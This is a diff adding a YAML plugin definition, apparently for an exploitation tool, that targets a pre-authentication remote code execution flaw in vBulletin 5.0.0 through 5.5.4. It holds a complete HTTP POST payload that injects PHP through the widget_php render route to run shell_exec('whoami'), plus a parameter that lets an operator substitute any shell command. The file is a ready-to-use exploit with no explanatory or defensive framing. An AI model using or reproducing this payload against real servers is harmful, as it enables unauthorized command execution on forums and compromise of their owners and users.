@@ -1,0 +1,29 @@
+info:
+    app: vBulletin
+    name: pre_auth_RCE
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2019-09-25"
+    create_date: "2024-10-06 09:08:58"
+    update_date: "2024-10-06 09:08:58"
+    scope: all versions from 5.0.0 till 5.5.4
+    payload: |-
+        POST / HTTP/1.1
+        Host: www.test.com
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Connection: close
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 106
+        Content-Type: application/x-www-form-urlencoded
+
+        widgetConfig%5Bcode%5D=echo+shell_exec%28%27whoami%27%29%3B+exit%3B&routestring=ajax%2Frender%2Fwidget_php
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
